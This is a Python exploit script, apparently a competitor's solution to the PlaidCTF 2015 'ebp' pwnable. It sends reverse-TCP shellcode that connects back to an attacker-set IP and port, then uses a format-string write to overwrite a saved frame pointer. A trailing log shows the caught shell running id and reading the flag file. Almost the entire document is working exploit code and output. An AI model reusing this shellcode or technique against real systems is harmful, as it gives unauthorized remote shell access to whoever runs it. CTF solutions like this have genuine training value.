#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# PlaidCTF 2015 
# PWNABLE EBP - 160pts
# Frame pointer overwrite
#
# danigargu @ w3b0n3s
#
# run as tcp server (debugging in local):
# socat -d -d TCP-LISTEN:4545,fork EXEC:"./ebp"
#

import socket
from struct import pack, unpack

HOST = '52.6.64.173'
PORT = 4545

def get_connection(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def make_write4(what, offset):
    fmt = "%" + str(what) + "c%" + str(offset) + "$n"
    return fmt

def main():

    rev_ip   = "XXX.XXX.XXX.XXX"
    rev_port = 55555

    # reverse tcp shellcode
    shellcode = (
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51" +
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc2\x31\xc0\x31\xc9\x51\x51\x68" +
        socket.inet_aton(rev_ip) + "\x66\x68" + pack(">H", rev_port) +
        "\xb1\x02\x66\x51\x89\xe7\xb3\x10\x53\x57\x52\x89\xe1\xb3\x03\xb0\x66" +
        "\xcd\x80\x31\xc9\x39\xc1\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\xb0" +
        "\x3f\x89\xd3\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd\x80\x31\xc0" +
        "\xb0\x3f\x89\xd3\xb1\x02\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73" +
        "\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31" +
        "\xc0\xb0\x01\xcd\x80"
    )

    buf = 0x804A080
    saved_ebp = "BBBB"
    junk = "A" * 100

    sc_addr = buf + len(junk) + len(saved_ebp) + 4
    payload = junk + saved_ebp + pack("<I", sc_addr) + shellcode
    fake_frame = buf + len(junk)

    try:
        print "[*] connecting to %s:%d" % (HOST, PORT) 
        s = get_connection(HOST, PORT)
        print "[*] sending payload..."
        s.send(payload + "\n")
        s.recv(0x400)

        # overwrite echo() saved ebp
        print "[*] overwriting echo() saved ebp"
        s.send(make_write4(fake_frame, 4) + "\n")        
        s.recv(0x400)

        # provoke break in while(1) at main() to get control of EIP
        s.close() 

    except Exception,e:
        print e

if __name__ == '__main__':
    main()


"""
$ ncat -lvvp 55555
Ncat: Version 6.47 ( http://nmap.org/ncat )
Ncat: Listening on :::55555
Ncat: Listening on 0.0.0.0:55555
Ncat: Connection from 52.6.64.173.
Ncat: Connection from 52.6.64.173:43058.
id
uid=1001(problem) gid=1001(problem) groups=1001(problem)
ls -l /home/problem
total 12
-r-xr-x--x 1 root root 7568 Apr 17 22:31 ebp
-r--r--r-- 1 root root   32 Apr 17 22:31 flag.txt
cat /home/problem/flag.txt
who_needs_stack_control_anyway
"""